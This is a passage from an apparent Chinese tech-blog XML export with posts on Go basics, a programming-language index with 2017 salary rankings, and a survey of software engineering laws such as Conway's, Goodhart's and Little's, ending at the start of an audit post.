<p><img src="http://riboseyim-qiniu.riboseyim.com/Books_Go_Programming_Blueprints.png" alt=""></p>
<h4 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h4><ul>
<li><a href="http://www.goodreads.com/author/show/1524282.Karl_Seguin">Karl Seguin</a></li>
</ul>
<p>book: <a href="https://github.com/thewhitetulip/web-dev-golang-anti-textbook/">https://github.com/thewhitetulip/web-dev-golang-anti-textbook/</a><br>youtube series: <a href="https://www.youtube.com/playlist?list=PL41psiCma00wgiTKkAZwJiwtLTdcyEyc4">https://www.youtube.com/playlist?list=PL41psiCma00wgiTKkAZwJiwtLTdcyEyc4</a><br>code: <a href="http://github.com/thewhitetulip/Tasks">http://github.com/thewhitetulip/Tasks</a></p>
<h2 id="Quickstart"><a href="#Quickstart" class="headerlink" title="Quickstart"></a>Quickstart</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过channel 实现协程间通信</span></span><br><span class="line"><span class="comment">// https://golangcaff.com/docs/the-way-to-go/142-covariance-channel/130</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">	time.Sleep(time.Second)</span><br><span class="line">	<span class="comment">// 通知任务已完成</span></span><br><span class="line">	done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> worker(done)</span><br><span class="line">	<span class="comment">// 等待任务完成</span></span><br><span class="line">	&lt;-done</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul>
<li><p>一些 package时候的会由于众所周知的原因而无法下载</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">unrecognized <span class="keyword">import</span> path <span class="string">&quot;golang.org/x/sys/unix&quot;</span></span><br><span class="line">cd $GOPATH/src/golang.org/x/</span><br><span class="line">git clone --depth=<span class="number">1</span> https:<span class="comment">//github.com/golang/xxx.git</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="http://alehander42.me/go">error handling in Go: more expressive syntax</a></p>
</li>
<li><a href="https://www.infoq.com/presentations/go-programming-language">(Slides) High Performance Go | Infoq.com </a></li>
</ul>
<h2 id="Security-Resources"><a href="#Security-Resources" class="headerlink" title="Security Resources"></a>Security Resources</h2><ul>
<li><a href="https://github.com/guardrailsio/awesome-golang-security">Awesome golang Security resources</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.gitbook.com/book/tiancaiamao/go-internals/details">GitBook:《深入解析Go》</a></li>
<li><a href="https://ipfans.github.io/2016/01/golang-vendor/">ipfans:使用vendor管理Golang项目依赖</a></li>
<li><a href="http://www.infoq.com/cn/articles/knowledge-behind-goroutine">(推荐)InfoQ:goroutine背后的系统知识</a></li>
<li><a href="http://studygolang.com/articles/2423">Qu Xiao:Goroutine + Channel 实践</a></li>
<li><a href="https://blog.gopheracademy.com/advent-2018/fmt/">A Dive Into the <code>fmt</code> Package</a></li>
<li><a href="https://blog.gopheracademy.com/advent-2018/interfaces-and-reflect/">The Relationship Between Interfaces and Reflection</a></li>
<li><a href="https://blog.gopheracademy.com/advent-2018/go-devops/">Using Go in Devops</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转编程语言:Ruby</title>
    <url>/2017/05/16/Language-Ruby-lang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h3 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h3><h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><ul>
<li>MacOS Package Manage : brew</li>
<li>OpenSource Project Manage : Redmine</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/26/Language/" target="_blank" rel="noopener">玩转编程语言系列</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>专题：编程语言系列</title>
    <url>/2017/05/26/Language/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>如何选择编程语言</li>
<li>Stack Overflow：2017年最赚钱的编程语言</li>
</ul>
<blockquote>
<p>程序员非常 <strong>忠于</strong> 他们心爱的语言。编程语言与其说它是技术，还不如说是程序员的思考模式。编程语言是技术和宗教的混合物。——《黑客与画家》（Hackers &amp; Painters）</p>
</blockquote>
<a id="more"></a>
<h2 id="论编程方法"><a href="#论编程方法" class="headerlink" title="论编程方法"></a>论编程方法</h2><blockquote>
<p>应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。《黑客与画家》（Hackers &amp; Painters）(p165 )</p>
</blockquote>
<ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Compiler/" target="_blank" rel="noopener">关于编译器（Compiler）&amp; 编译原理</a></li>
</ul>
<h2 id="玩转编程语言"><a href="#玩转编程语言" class="headerlink" title="玩转编程语言"></a>玩转编程语言</h2><ul>
<li><a href="https://riboseyim.github.io/2019/01/07/Language-C-lang/" target="_blank" rel="noopener">玩转编程语言：C 语言</a></li>
<li><a href="https://riboseyim.github.io/2017/05/05/Language-Go-lang/" target="_blank" rel="noopener">玩转编程语言：Go 语言</a></li>
<li><a href="https://riboseyim.github.io/2017/05/16/Language-Perl-lang/" target="_blank" rel="noopener">玩转编程语言：Perl 语言</a></li>
<li><a href="https://riboseyim.github.io/2017/06/19/Language-Python-lang/" target="_blank" rel="noopener">玩转编程语言：Python 语言</a></li>
<li><a href="https://riboseyim.github.io/2017/05/16/Language-Node-lang/" target="_blank" rel="noopener">玩转编程语言：Node.js 语言</a></li>
<li><a href="https://riboseyim.github.io/2017/05/16/Language-R-lang/" target="_blank" rel="noopener">玩转编程语言：R 语言</a></li>
<li><a href="https://riboseyim.github.io/2017/05/16/Language-Ruby-lang/" target="_blank" rel="noopener">玩转编程语言：Ruby 语言</a></li>
<li><a href="https://riboseyim.github.io/2019/01/07/Language-Java-lang/" target="_blank" rel="noopener">玩转编程语言：Java 语言</a></li>
<li><a href="http://riboseyim.github.io/2018/08/23/Language-Lua-lang/" target="_blank" rel="noopener">玩转编程语言：Lua 语言</a></li>
<li><a href="https://www.erlang-solutions.com/blog/twenty-years-of-open-source-erlang.html#disqus_thread" target="_blank" rel="noopener">玩转编程语言：Erlang 语言</a></li>
<li><a href="https://stackoverflow.com/questions/8628326/what-is-the-difference-between-a-wrapper-bindings-and-a-port" target="_blank" rel="noopener">What is the difference between a wrapper, bindings and a port?</a></li>
<li><a href="https://akr.am/languages/" target="_blank" rel="noopener">A graph of programming languages connected through compilers </a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language_Compilers.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language_Compiler_Java_C.png" alt></p>
<h4 id="关注"><a href="#关注" class="headerlink" title="关注"></a>关注</h4><ul>
<li><a href="https://dimensionless.in/will-julia-replace-python-and-r-for-data-science/" target="_blank" rel="noopener">Will Julia Replace Python and R for Data Science?</a></li>
</ul>
<h2 id="如何选择编程语言"><a href="#如何选择编程语言" class="headerlink" title="如何选择编程语言"></a>如何选择编程语言</h2><p>在不考虑其他因素的情况下，总的来看，对于应用程序来说，<strong>选择总体上最强大、效率也在可接受范围内的编程语言</strong>。</p>
<p>如果从 <strong>图灵等价（Turing-equivalent）</strong> 的角度看来看，所有语言都是一样强大的，但是这对程序员没有意义。关于强大很难正式定义，有一个解释方法是一些功能在一种语言是内置的，但是在另一种语言中需要修改解释器才能做到，那么前者就比后者更强大。</p>
<p>如果A语言有一个运算符可以移除字符串中的空格，而B语言没有这个运算符，这种情况则不足以称A语言比B语言强大，因为你可以在B语言里写一个函数实现这个功能。但是A语言支持某种高级功能（假定是递归），而B语言不支持，你就不可能通过自己编写函数库解决了，这就代表A语言比B语言更强大。</p>
<ul>
<li>例外情况：<br>1）如果在开发的程序必须与另一个程序紧密配合，那么可能最好还是使用后者的开发语言。<br>2）如果程序只是要做一些很简单的事（比如整数运算或位操作），那就不妨使用一种比较靠近机器的低层次语言，这样运行起来会更快一些。<br>3）如果程序只是为了特定场合一次性使用，那么你最好根据自己需要解决的问题选择具有强大函数库的语言。</li>
</ul>
<h2 id="论编程方法-1"><a href="#论编程方法-1" class="headerlink" title="论编程方法"></a>论编程方法</h2><blockquote>
<p>书上说，调试（debugging）是最后的步骤，用来纠正打字的错误和疏忽。可是我的工作方法看上去却像编程就是在调试。编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。《黑客与画家》（Hackers &amp; Painters）(p22)</p>
<p>不要把编程语言看成那些已完成的程序的表达方式，而应该把它理解成促进程序从无到有的一种媒介。这里的意思是说，成品的材料和开发时用的材料其实是不一样的。搞艺术的人都知道，这两个阶段往往需要不同的媒介。比如，大理石是一种非常良好、耐用的材料，很适合用于最后的成品，但是它极其缺乏弹性和灵活性，所以不适合在构思阶段用来做模型。《黑客与画家》（Hackers &amp; Painters）（p215）</p>
</blockquote>
<h2 id="Stack-Overflow：2017年最赚钱的编程语言"><a href="#Stack-Overflow：2017年最赚钱的编程语言" class="headerlink" title="Stack Overflow：2017年最赚钱的编程语言"></a>Stack Overflow：2017年最赚钱的编程语言</h2><ul>
<li>Source: <a href="https://www.stackoverflowbusiness.com/blog/the-highest-paying-web-development-languages-in-2017" target="_blank" rel="noopener">The Highest Paying Programming Languages in 2017</a></li>
</ul>
<p>Post By <a href="https://www.linkedin.com/in/richardmoy/" target="_blank" rel="noopener">Rich Moy</a>: a Content Marketing Writer and Developer Hiring Expert at Stack Overflow.</p>
<h4 id="Top-Paying-Languages-in-the-US"><a href="#Top-Paying-Languages-in-the-US" class="headerlink" title="Top-Paying Languages in the US"></a>Top-Paying Languages in the US</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/05/Go/" target="_blank" rel="noopener">Go</a> - $110,000</li>
<li>Scala - $110,000</li>
<li>Objective-C - $109,000</li>
<li>CoffeeScript - $105,000</li>
<li><a href="https://riboseyim.github.io/2017/05/16/Language-Perl-lang/" target="_blank" rel="noopener">Perl</a> - $105,000</li>
<li>C++- $100,890</li>
<li><a href="https://riboseyim.github.io/2017/05/16/Language-R-lang/" target="_blank" rel="noopener">R</a> - $100,000</li>
<li>Swift- $100,000</li>
<li>TypeScript- $100,000</li>
<li>Python- $99,000</li>
</ul>
<p>根据Stack Overflow 的统计数据，2009至2017之间, Go程序员的报酬增长了 1200% ， Scala 增长了 1250%。注意：单位是 $ ，刀 ,美刀 ！<br><img src="http://riboseyim-qiniu.riboseyim.com/Language_Paying_GO_2017.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language_Paying_Scala_2017.png" alt></p>
<h4 id="Top-Paying-Languages-in-Worldwide"><a href="#Top-Paying-Languages-in-Worldwide" class="headerlink" title="Top-Paying Languages in Worldwide"></a>Top-Paying Languages in Worldwide</h4><ul>
<li>Clojure - $72,000</li>
<li>Rust - $65,714</li>
<li>Elixir - $65,000</li>
<li>F# - $64,516</li>
<li>Go - $64,516</li>
<li>Perl - $63,068</li>
<li>Groovy - $61,809</li>
<li>Ruby - $60,000</li>
<li>Scala - $60,000</li>
<li>R - $57,125</li>
</ul>
<p>Clojure（发音类似”closure”）是一套现代的Lisp语言的动态语言版。它是一个函数式多用途的语言。Clojure可以执行于Java虚拟机，通用语言运行时以及JavaScript引擎之上,拥有复杂的宏。Clojure第一个稳定版本1.0于2009年5月4日发布，最新的稳定版本是1.8（2016-01-19日）。应用案例：沃尔玛仓储数据库系统、Web新闻和博客信息分析（Chartbeat）、设计开发和基础设施管理工具（8th Light 、Puppet）等，更多 &gt;&gt;&gt;&gt; <a href="https://clojure.org/community/success_stories。" target="_blank" rel="noopener">https://clojure.org/community/success_stories。</a></p>
<p>Elixir是一个基于 Erlang 虚拟机的函数式、面向并行的通用编程语言。可通过宏实现元编程对其进行扩展，并通过协议支持多态，目标是在维持与现有Erlang工具链及生态环境兼容性的同时，让人们可以在Erlang虚拟机上进行扩展性更好的、高生产率的开发。发行时间 2012年，最新版本 1.4.0（2017年1月5日）。</p>
<h4 id="你可能是一个假的程序员"><a href="#你可能是一个假的程序员" class="headerlink" title="你可能是一个假的程序员"></a>你可能是一个假的程序员</h4><p>很多同学看了这个排行榜是不是已经跃跃欲试要去美帝捞金了呢？且慢，最好考虑一下能不能通过海关和移民局的审查先。年初，有一位尼日利亚老兄到美帝打短工就差点被当作非法移民遣返：</p>
<blockquote>
<p>Questions to ask a software engineer:<br>“Write a function to check if a Binary Search Tree is balanced.”<br>海关官员：来，走一个，检查二叉树是否平衡，手写代码…..<br>小哥：What….<br>“What is an abstract class, and why do you need it?”<br>海关官员：什么是抽象类，你为什么要使用它?<br>小哥卒</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language_Program_US_IM_Twitter.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Language_Pragram_US_IM_Discuss.png" alt></p>
<h2 id="社交语言"><a href="#社交语言" class="headerlink" title="社交语言"></a>社交语言</h2><ul>
<li><a href="https://www.1843magazine.com/content/ideas/robert-lane-greene/which-best-language-learn" target="_blank" rel="noopener">WHICH IS THE BEST LANGUAGE TO LEARN?</a><br>Once a mark of the cultured, language-learning is in retreat among English speakers. It’s never too late, but where to start?</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/ZMsVmkTqx9asr4-T8t6wvA" target="_blank" rel="noopener">每个程序员书柜必备的编程书籍 |原创 2016-11-04 Dan Luu、刘志勇 InfoQ</a></li>
<li><a href="http://www.openculture.com/2017/11/a-map-showing-how-much-time-it-takes-to-learn-foreign-languages-from-easiest-to-hardest.html" target="_blank" rel="noopener">A Map Showing How Much Time It Takes to Learn Foreign Languages: From Easiest to Hardest</a></li>
<li><a href="https://www.linkedin.com/pulse/software-engineer-detained-several-hours-us-customs-given-fairchild" target="_blank" rel="noopener">A software engineer is detained for several hours by U.S. Customs — and given a test to prove he’s an engineer</a></li>
<li><a href="http://news.xinhuanet.com/world/2017-03/03/c_129500094.htm" target="_blank" rel="noopener">新华社：入境美国还要先答题？这个程序员差点吃闭门羹</a></li>
<li><a href="https://jvns.ca/blog/2016/01/10/why-i-rust/" target="_blank" rel="noopener">Julia Evans：Why I love Rust</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程实践中的十大法则</title>
    <url>/2017/07/05/Law-Of-Engineering/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>0.1 Moore’s Law</li>
<li>0.2 Metcalfe’s Law</li>
<li>1、Little’s Law</li>
<li>2、Goodhart’s Law</li>
<li>3、Conway’s Law</li>
<li>4、Parkinson’s Law</li>
<li>5、Humphrey’s Law</li>
<li>6、Law of the instrument</li>
<li>7、Law of Demeter</li>
<li>8、Dude’s Law</li>
<li>9、Law of 2 Feet</li>
<li>10、Law of Propinquity</li>
<li>11、Linus’ Law</li>
</ul>
<span id="more"></span>
<h4 id="0-1-Moore’s-Law"><a href="#0-1-Moore’s-Law" class="headerlink" title="0.1 Moore’s Law"></a>0.1 Moore’s Law</h4><p>摩尔定律,由英特尔创始人之一戈登·摩尔提出来的。其内容为：积体电路上可容纳的电晶体（晶体管）数目，约每隔两年便会增加一倍。主要有以下三种演绎版本：</p>
<ul>
<li>集成电路芯片上所集成的电路的数目，每隔18个月就翻一倍。</li>
<li>微处理器的性能每隔18个月提高一倍，或价格下降一半。</li>
<li>用一个美元所能买到的电脑性能，每隔18个月翻两倍。</li>
</ul>
<p>这个定律 <strong>被引用最多，分歧很大，反对声音也最多</strong>，有预测认为摩尔定律的极限将在2025年左右到来，但也有更乐观的预测认为还能持续更久。</p>
<h4 id="0-2-Metcalfe’s-Law"><a href="#0-2-Metcalfe’s-Law" class="headerlink" title="0.2 Metcalfe’s Law"></a>0.2 Metcalfe’s Law</h4><p>梅特卡夫定律，由乔治·吉尔德于1993年提出，但以计算机网络先驱、3Com公司的创始人罗伯特·梅特卡夫的姓氏命名。内容是：一个网络的价值等于该网络内的节点数的平方，而且该网络的价值与联网的用户数的平方成正比。该定律指出，一个网络的用户数目越多，那么整个网络和该网络内的每台电脑的价值也就越大。</p>
<h4 id="1-Little’s-Law"><a href="#1-Little’s-Law" class="headerlink" title="1. Little’s Law"></a>1. Little’s Law</h4><p><strong>Cycle Time = Work in Progress / Throughput</strong></p>
<p>中译为利特尔法则，由MIT （Sloan School of Management）的教授John Little于1961年提出：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。</p>
<blockquote>
<p>the relationship between the average number of customers in a store, their arrival rate, and the average time in the store.</p>
</blockquote>
<p>应用领域：精益生产、系统运筹方面应用广泛，Kanban(看板)方法论的基石。</p>
<blockquote>
<p>It is the basis of Kanban.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/PM_Tools_kanban_Demo_5.png" alt=""></p>
<blockquote>
<p>The power of Little’s Law to Kanban teams is not its ability to predict WIP, Thoughput or Leadtime. The true power lies in its ability to influence team behavior with its underlying assumptions.</p>
</blockquote>
<h4 id="2-Goodhart’s-Law"><a href="#2-Goodhart’s-Law" class="headerlink" title="2. Goodhart’s Law"></a>2. Goodhart’s Law</h4><blockquote>
<p>When a measure becomes a target, it ceases to be a good measure.<br><strong>当一个政策变成目标，它将不再是一个好的政策。</strong></p>
</blockquote>
<p>古德哈特定律（Goodhart’s law），是以<a href="Charles Goodhart">Charles Goodhart</a>的名字命名，他在1975年的文章中首次发表（当时作为英格兰银行的政策建议）：当政府试图管理这些金融财产的特别标识时，它们便不再是可信的经济风向标。应用领域：公共管理，敏捷开发，目标管理</p>
<blockquote>
<p>了解一个指标有意义与否的一个好的方法是试着去理解其所体现的个人价值。关注那些可以给出好的建议、体现沟通技能和良好态度，尤其是需要巨大的付出才能作弊的指标。</p>
</blockquote>
<ul>
<li><p><a href="http://www.sohu.com/a/136852371_163156">程序员日志：是什么导致优秀的程序员写出如此垃圾的代码？</a></p>
</li>
<li><p><a href="http://lesswrong.com/lw/1ws/the_importance_of_goodharts_law/">blogospheroid:The Importance of Goodhart’s Law</a></p>
</li>
</ul>
<h4 id="3-Conway’s-Law"><a href="#3-Conway’s-Law" class="headerlink" title="3. Conway’s Law"></a>3. Conway’s Law</h4><p><strong>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致 — Melvyn Conway, 1967</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_Org.png" alt=""></p>
<blockquote>
<p>《人月神话》：Adding manpower to a late software project makes it later —Fred Brooks, (1975)</p>
</blockquote>
<p>为了赶进度加程序员就像用水去灭油锅里的火一样，原因在于：沟通成本 = n(n-1)/2，沟通成本随着项目或者组织的人员增加呈指数级增长。很多项目在经过一段时间的发展之后，都会有不少恐龙级代码，无人敢挑战。比如一个类的规模就多达数千行，核心方法近千行，大量重复代码，每次调整都以失败告终。庞大的系统规模导致团队新成员接手困难，项目组人员增加导致的代码冲突问题，系统复杂度的增加导致的不确定上线风险、引入新技术困难等。应用领域：Micro-Service 微服务</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroServices_Math_Demo.png" alt=""></p>
<h4 id="4-Parkinson’s-Law"><a href="#4-Parkinson’s-Law" class="headerlink" title="4. Parkinson’s Law"></a>4. Parkinson’s Law</h4><blockquote>
<p>Work expands so as to fill the time available for its completion.<br><strong>在工作能够完成的时限内，工作量会一直增加，直到所有可用时间都被填充为止</strong></p>
</blockquote>
<p>帕金森定理（英语：Parkinson’s law），由英国作家<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%87%8C%E7%88%BE%C2%B7%E8%AB%BE%E6%96%AF%E5%8F%A4%E5%BE%B7%C2%B7%E5%B8%95%E9%87%91%E6%A3%AE">西里尔·诺斯古德·帕金森</a>提出，语最早出现在1955年《经济学人》中的幽默短文。在他后续的书中进一步阐述（《Parkinson’s Law: The Pursuit of Progress》）。官僚组织随着时间而扩大的速率。一个官僚组织(作者注：包括非政府组织)中的雇员总数，通常以每年5-7%的速度增加。他认为，有两股力量造成了这个增长：(1) 一个官员希望他的下属增加，但不希望解雇造成敌人增加；以及(2) 官员会制造工作给彼此。 <strong>同意！</strong></p>
<h4 id="5-Humphrey’s-Law"><a href="#5-Humphrey’s-Law" class="headerlink" title="5. Humphrey’s Law"></a>5. Humphrey’s Law</h4><blockquote>
<p>The user will never know what they want until after the system is in production (maybe not even then)<br><strong>用户将永远不知道他们想要什么，直到系统已经上线。（也许上线了也不知道）</strong></p>
<p>“服务员，给我来份宫保鸡丁！”<br>“好嘞！”<br>——————这叫原始需求<br>大厨做到一半。<br>“服务员，菜里不要放肉。”<br>“不放肉怎么做啊？”<br>“不放肉就行了，其它按正常程序做，不就行了，难吗？”<br>“好的您稍等”<br>——————中途需求变更<br>大厨：”你大爷，我肉都回锅了”<br>服务员：”顾客非要要求的嘛，你把肉挑出来不就行了吗”<br>大厨：”行你大爷”  然而还是一点点挑出来了<br>——————改动太大，部分重构<br>。。。。。。<br>“服务员，这样吧，腐竹不要了，换成蒜毫能快点吗？对了，顺便加点番茄酱”<br>——————因工期过长再次改动需求<br>大厨：”我日了狗啊，你TM不知道蒜毫也得焯水啊？还有你让我怎么往热菜里放番茄酱啊？？”<br>服务员：”焯水也比等腐竹强吧，番茄酱往里一倒不就行了吗？很难吗？”<br>大厨：”腐竹我还得接着泡，万一这孙子一会又想要了呢。”<br>——————频繁改动开始导致大量冗余</p>
</blockquote>
<ul>
<li><a href="https://www.maxcell.org/xiaohua/2016/009953.html">冷兔笑话：码农做项目与点菜类比的笑话</a></li>
<li><a href="https://www.linkedin.com/pulse/20140712143010-6227721-the-three-laws-of-software-development-humphrey-s-law">John Eaton:The Three Laws of Software Development - Humphrey’s Law</a></li>
</ul>
<h4 id="6-Law-of-the-instrument"><a href="#6-Law-of-the-instrument" class="headerlink" title="6. Law of the instrument"></a>6. Law of the instrument</h4><blockquote>
<p>If all you have is a hammer, everything looks like a nail</p>
</blockquote>
<p><strong>工具定律，锤子定律或马斯洛的锤子</strong>。表现为对一个熟悉的工具过度的依赖，“如果你有的只是一个锤子，那么所有的东西看起来都像一个钉子”以及一些由此转化的说法，来自于亚伯拉罕·马斯洛1966年发行的《科学的心理学》一书。例如：</p>
<ul>
<li>“XXX是世界上最好的语言，没有之一”</li>
<li><p>“加强party的领导”</p>
</li>
<li><p><a href="https://www.youtube.com/watch?v=7bf8uzAVsRE">Youtube:Law of the instrument</a></p>
</li>
</ul>
<h4 id="7-Law-of-Demeter"><a href="#7-Law-of-Demeter" class="headerlink" title="7. Law of Demeter"></a>7. Law of Demeter</h4><blockquote>
<p>Law of Demeter is also called “Principle of Least Knowledge”</p>
</blockquote>
<p>得墨忒耳定律（Law of Demeter，缩写LoD）是一种软件开发的设计指导原则，特别是面向对象的程序设计。美国东北大学在1987年末发明，名称来源于希腊神话中的农业女神，孤独的得墨忒耳。简单描述为:</p>
<ul>
<li>每个单元对于其他的单元只能拥有有限的知识：只是与当前单元紧密联系的单元；</li>
<li>每个单元只能和它的朋友交谈：不能和陌生单元交谈；</li>
<li>只和自己直接的朋友交谈。</li>
</ul>
<p>a.b.Method()违反了此定律，而a.Method()不违反此定律。一个简单例子是，人可以命令一条狗行走（walk），但是不应该直接指挥狗的腿行走，应该由狗去指挥控制它的腿如何行走。</p>
<ul>
<li><a href="https://www.dan-manges.com/blog/37">Dan Manges:Misunderstanding the Law of Demeter</a></li>
</ul>
<h4 id="8-Dude’s-Law"><a href="#8-Dude’s-Law" class="headerlink" title="8. Dude’s Law"></a>8. Dude’s Law</h4><p><strong>Value (of a project) = Why over How [or Value = Why / How]</strong></p>
<blockquote>
<p>“David [the law’s creator] comes from the music industry. New musicians focus on having a nice sound. Professional musicians first think about the mood of the song, the emotion they want to bring across and then work out the sound that fits it”</p>
</blockquote>
<p>该法则的发明者来自音乐产业。新手音乐家注重好听的声音。专业的音乐家首先考虑歌曲的情绪，他们想要传达的情感，然后找出适合它的声音。应用领域：项目管理、目标管理</p>
<ul>
<li><p><a href="http://devjam.com/2010/08/05/dudes-law-gordon-pask-shoveler/">Dude’s Law, Don Reinertsen and Walmart</a></p>
</li>
<li><p><a href="https://futureofprojectmanagement.com/2012/06/21/how-does-a-former-musician-build-a-successful-business-in-the-agile-space-devjam-leads-the-way-with-david-hussman/">How does a former musician build a successful business in the agile space? DevJam leads the way with David Hussman</a></p>
</li>
</ul>
<h4 id="9-Law-of-2-Feet"><a href="#9-Law-of-2-Feet" class="headerlink" title="9. Law of 2 Feet"></a>9. Law of 2 Feet</h4><blockquote>
<p>If at any time during our time together you find yourself in any situation where you are neither learning nor contributing, use your two feet, go someplace else.</p>
</blockquote>
<p><img src="https://workshopbank.com/wp-content/uploads/2016/11/open-space-guidlines.jpg" alt=""></p>
<p>应用领域：组织沟通</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=QhNQ8Mhehpw">Youtube:Online Open Space Technology Meetings</a></li>
<li><a href="https://en.wikiversity.org/wiki/Open_Space_Technology">Open Space Technology</a></li>
<li><a href="http://openspaceworld.org/wp2/what-is/">What Is Open Space Technology?</a></li>
</ul>
<h4 id="10-Law-of-Propinquity"><a href="#10-Law-of-Propinquity" class="headerlink" title="10. Law of Propinquity"></a>10. Law of Propinquity</h4><blockquote>
<p>The probability of two people communicating is inversely proportional to the distance between them.两个人交流的概率与他们之间的距离成反比。数字时代亦然。</p>
<p>Cucumbers get more pickled than brine gets cucumbered.<br><strong>当你进入一个环境，它会更多地影响你而不是相反</strong></p>
</blockquote>
<p><strong>the more we see people and interact with them, the more probable we are to like them.</strong></p>
<ul>
<li><a href="http://chiefmartec.com/2009/01/twitter-and-the-law-of-propinquity/">Twitter and the law of propinquity</a></li>
<li><a href="http://www.giveemthepickle.com/pickle_principle.htm">Bonus: Prescott’s Pickle Principle</a></li>
</ul>
<h4 id="11-Linus’-Law"><a href="#11-Linus’-Law" class="headerlink" title="11. Linus’ Law"></a>11. Linus’ Law</h4><p>以Linux创始人林纳斯·托瓦兹（Linus Torvalds）的名字来命名，但最先由埃里克·斯蒂芬·雷蒙（Eric S. Raymond）的作品《大教堂和市集》（The Cathedral and the Bazaar）中所提出。“足够多的眼睛，就可让所有问题浮现”（given enough eyeballs, all bugs are shallow）。</p>
<p>应用领域：代码审查。“只要有足够的单元测试员及共同开发者，所有问题都会在很短时间内被发现，而且能够很容易被解决”。将代码展示给更多开发者以达成共识。在2001年出版的《黑客伦理与信息时代的精神》(The Hacker Ethic And the Spirit of th Information Age)里，林纳斯在其为此书做的序言中，自己定义了另外一个林纳斯定律</p>
<blockquote>
<p>人类所有的动机可分为递进的三种类型 — 生存（survival）、社会生活（social life）、娱乐（entertainment）。…… “黑客”是已经超越利用计算机谋生存而进入后面两个阶段的人。计算机本身就是娱乐。黑客坚信没有比这更高的动力阶段。</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">Linus Torvalds:Just for Fun</a></li>
<li><a href="http://www.jianshu.com/p/841862adb059">Linus Torvalds: The mind behind Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.defmacro.org/2016/12/22/models.html">Mental models | Dec 22, 2016</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>信息系统审计 (Information Systems Auditor)</title>
    <url>/2019/12/08/Law-of-CISA/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
